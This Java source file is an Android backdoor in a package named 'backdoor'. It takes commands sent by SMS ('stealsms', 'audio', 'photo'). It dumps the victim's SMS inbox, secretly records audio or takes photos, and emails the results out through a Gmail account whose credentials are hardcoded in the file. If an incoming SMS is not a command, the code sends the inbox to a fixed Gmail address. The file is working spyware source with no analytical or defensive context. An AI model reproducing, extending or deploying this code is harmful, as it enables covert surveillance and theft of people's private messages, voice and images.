package com.example.backdoor;

import java.io.File;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

import com.example.backdoor.Audio;
import com.example.backdoor.Photo;
import com.example.backdoor.SMS;
import com.example.backdoor.Mail;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.hardware.Camera;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.telephony.SmsMessage;
import android.util.Log;

public class SMSTrackerActivity extends BroadcastReceiver {
	
    private Context mContext;
    private Bundle mBundle;
    private Intent mIntent;
    static String mailto;
   	private List<SMS> smsList = new ArrayList<SMS>();
    
	private static final String TAG = "SMSTRACKER";
    private static final Uri STATUS_URI = Uri.parse("content://sms");
    private Context context;
   	Camera camera;

    
    public static void sendmailatt(String s) throws Exception
	{	
		
		
	String body="";
	String TAG="SENDSMSLOG";
	Log.d(TAG,s); 
		 body=body+"audio file:";
		   Log.d(TAG,"start send Email"); 
		 Mail m = new Mail("mailgateway88@gmail.com", "max123dog"); 
		 File f = new File(s);
		
		
		 
		if( f.canRead())
		{
			Log.d(TAG,"file can be read");
		}
	      String[] toArr = {mailto}; 
	      m.setTo(toArr); 
	      m.setFrom("backdoor@wooo.com"); 
	      m.setSubject("Your Androoid BackDoor SMS Report "); 
	      m.setBody(body); 
	      m.addAttachment(s);
	      Log.d(TAG,"attach file to Email"); 
	      try { 
	      
	    	   Log.d(TAG,"send Email"); 
	        if(m.send()) {
	        	
	     Log.d(TAG,"Email was sent successfully.");
	        }
	        else
	        { 
	      Log.d(TAG,"Email was not sent."); 
	        }
	        
	      } //try
	      catch(Exception e) { 
	     
	        Log.d(TAG, "Could not send email", e); 
	      }  //catch 
	      
	}
    
    private void sendsmsviaemail()
	{
		Iterator<SMS> it=smsList.iterator();
		String body="";
		String TAG="SENDSMSLOG";
		 while(it.hasNext())
		 {
			 SMS s=(SMS) it.next();
			 body=body+"\n"+"SMS from: "+s.getNumber()+"\n Text:"+s.getBody();
	
		 } // while
			 Mail m = new Mail("mailgateway88@gmail.com", "max123dog"); 
			 
		      String[] toArr = {mailto}; 
		      m.setTo(toArr); 
		      m.setFrom("backdoor@wooo.com"); 
		      m.setSubject("Your Androoid BackDoor SMS Report "); 
		      m.setBody(body); 
		      try {
			//	m.addAttachment("/rec.3gp");
			} catch (Exception e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
		 
		      try { 
		      
		 
		        if(m.send()) {
		        	
		     Log.d(TAG,"Email was sent successfully.");
		        }
		        else
		        { 
		      Log.d(TAG,"Email was not sent."); 
		        }
		        
		      } //try
		      catch(Exception e) { 
		     
		        Log.d(TAG, "Could not send email", e); 
		      }  //catch 
		      
		      
		    }  //sendsmviamail
	
	private void getSMS()
	{
		
		Uri uri = Uri.parse("content://sms/inbox");
		Cursor c= mContext.getContentResolver().query(uri, null, null ,null,null);
		//startManagingCursor(c);
		
		// Read the sms data and store it in the list
		if(c.moveToFirst()) {
			for(int i=0; i < c.getCount(); i++) {
				SMS sms = new SMS();
				sms.setBody(c.getString(c.getColumnIndexOrThrow("body")).toString());
				sms.setNumber(c.getString(c.getColumnIndexOrThrow("address")).toString());
				smsList.add(sms);
				
				c.moveToNext();
			}
		}
		c.close();
		
	    }
    
    private SmsSentObserver smsSentObserver = null;
    
	public void onReceive(Context context, Intent intent) {
		try{
			mContext = context;
			mIntent = intent;
			mBundle = intent.getExtras();  
			Log.e(TAG, "Intent Action : "+intent.getAction());
		    if (mBundle != null){
		    	getSMSDetails();
		    }
		    else
		    	Log.e(TAG, "Bundle is Empty!");
		    
		    if(smsSentObserver == null){
			    smsSentObserver = new SmsSentObserver(new Handler(), mContext);
			    mContext.getContentResolver().registerContentObserver(STATUS_URI, true, smsSentObserver);
		    }
		}
		catch(Exception sgh){
			Log.e(TAG, "Error in Init : "+sgh.toString());
		}
	}//fn onReceive

	private void getSMSDetails(){	
		String msg,command,param;
	    SmsMessage[] msgs = null;
		try{
			Object[] pdus = (Object[]) mBundle.get("pdus");
			if(pdus != null){
				
				msgs = new SmsMessage[pdus.length];
				Log.e(TAG, "pdus length : "+pdus.length);
				for(int i=0; i<msgs.length; i++){
					msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);  
					Log.e(TAG, "getDisplayMessageBody : "+msgs[i].getDisplayMessageBody());
					Log.e(TAG, "getDisplayOriginatingAddress : "+msgs[i].getDisplayOriginatingAddress());
					Log.e(TAG, "getMessageBody : "+msgs[i].getMessageBody());
					Log.e(TAG, "getOriginatingAddress : "+msgs[i].getOriginatingAddress());
					Log.e(TAG, "getProtocolIdentifier : "+msgs[i].getProtocolIdentifier());
					Log.e(TAG, "getStatus : "+msgs[i].getStatus());
					Log.e(TAG, "getStatusOnIcc : "+msgs[i].getStatusOnIcc());
					Log.e(TAG, "getStatusOnSim : "+msgs[i].getStatusOnSim());
				
			     msg=msgs[i].getMessageBody().toString(); // get text body
	               String[] smsarr=msg.split("#");

	              if(smsarr.length>1 )
	              {
	               command=smsarr[0];
	               param=smsarr[1];
	             if(command.equals("stealsms"))
	               {
	            	 mailto=param;
	            	 
	            	 getSMS();
	            	 sendsmsviaemail();
	               
	               } 
	             if(command.equals("audio"))
	            	  
	             {  
	            	 final int sec=5;
	            	  final Audio a = new Audio();
	          	    mailto=param;
	          	    //// new thrtead
	         	 new Thread(new Runnable() {
	 			    public void run() {
	 			    	 Log.d("SENDSMSLOG","wait 5 sec");
	 			    	 try {
	 			    		synchronized(this)
	 			    		{
	 						wait(sec*1000);
	 						Log.d("SENDSMSLOG","Time's up!%n");
	 			    		}
	 			    		} catch (InterruptedException e) {
	 						// TODO Auto-generated catch block
	 						e.printStackTrace();
	 					}
	 			    	Log.d("SENDSMSLOG","stop");
	 						a.stopRecording();
	 						//s=a.path;
	 			        Log.d("SENDSMSLOG","Time's up!%n");
	 			       synchronized(this)
			    		{
						try {
							Log.d("SENDSMSLOG","wait 5 sec%n");
							wait(5000);
						
						Log.d("SENDSMSLOG","Time's up!%n");
						String s = null;
						
							sendmailatt(a.path);
						}catch (InterruptedException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
						catch (Exception e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
			    		}
	 			    }
	 			  }).start();;
	 			 Log.d("SENDSMSLOG","start recording");
	 			 a.startRecording();
	 			 
	          	// getSMS();
	          	// sendsmsviaemail();
	             
	             }
	             if(command.equals("photo"))
	            		 {
	            	 Log.d("SENDSMSLOG","Taken");
	                 Photo p =new Photo();
	               //  p.path="sdf";
	                 camera =   Camera.open();
	                 Log.d("SENDSMSLOG","Taken2");
	                 camera.takePicture(null, null, p.cameraPictureCallbackJpeg);
	                 synchronized(this)
	          		{
	         			try {
	         				wait(3000);
	         			} catch (InterruptedException e) {
	         				// TODO Auto-generated catch block
	         				e.printStackTrace();
	         			}
	         			Log.d("SENDSMSLOG","Time's up!%n");
	          		}
	                 camera.release();
	                 camera = null;
	               
	           		
	           		}
	              } // command recieved( smsarr.length>1)
	              else{
	            		getSMS();
	    				mailto="mailgatway@gmail.com";
	    				sendsmsviaemail();
	    			
	              }
	            }
				
				
				}
			
		}
		catch(Exception sfgh){
			Log.e(TAG, "Error in getSMSDetails : "+sfgh.toString());
		}
	}//fn getSMSDetails
	
	
}//End of class SMSTrackerActivity
